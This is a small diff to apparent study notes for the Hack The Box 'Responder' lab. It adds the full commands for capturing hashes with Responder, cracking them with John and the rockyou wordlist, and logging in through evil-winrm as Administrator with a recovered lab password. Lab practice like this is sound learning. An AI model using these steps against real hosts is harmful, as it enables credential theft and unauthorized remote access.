@@ -2,5 +2,5 @@ nmap
 
 ftp
 
-Responder RemoteFileInclude John evil-winrm  https://medium.com/rakulee/hack-the-box-starting-point-responder-solution-d0fa2ea77a56
+Responder 'responder -I Tun0'  RemoteFileInclude John'sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' evil-winrm''sudo evil-winrm -i 10.129.140.201 -u Administrator -P 5985 -p badminton  https://medium.com/rakulee/hack-the-box-starting-point-responder-solution-d0fa2ea77a56
 
